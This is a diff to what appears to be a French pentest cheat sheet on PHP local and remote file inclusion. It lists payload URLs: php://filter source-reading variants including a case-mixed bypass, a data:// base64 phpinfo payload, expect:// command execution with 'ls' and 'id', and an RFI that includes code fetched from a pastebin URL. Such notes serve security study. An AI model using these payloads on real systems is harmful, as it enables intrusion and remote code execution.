@@ -106,19 +106,11 @@ Les fichiers intéressants :
 
 **Wrapper php://filter**
 
-`https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php`
+`https://fhbapt.github.io/?page=php://filter/read=string.rot13/resource=index.php` Récupérer une page en la convertissant en rot13
 
-`http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php`
+`https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php` "" base64
 
-**Wrapper data://**
-
-`https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`
-
-`La payload est <?php phpinfo(); ?>`
-
-**Wrapper expect://**
-
-`https://fhbapt.github.io/?page=expect://ls`
+`https://fhbapt.github.io/?page=pHp://FilTer/convert.base64-encode/resource=index.php` "" avec variation des min/MAJ
 
 ### RFI (Remote File Inclusion) <a name="rfi"></a>
 
@@ -130,6 +122,23 @@ Exemple de RFI :
 <?php @include($_GET['page']) ?>
 ```
 
+**Basic RFI**
+
 Utilisation de pastbin pour émuler le serveur et inclure le code du pastbin:
 
-```https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG``` 
+```https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG``` Le pastbin correspond à un phpinfo()
+
+**Wrapper data://**
+
+```
+https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+# La payload est <?php phpinfo(); ?>
+```
+
+**Wrapper expect://**
+
+> Permet d'interpreter du code système directement
+
+`https://fhbapt.github.io/?page=expect://ls`
+
+`https://fhbapt.github.io/?page=expect://id`
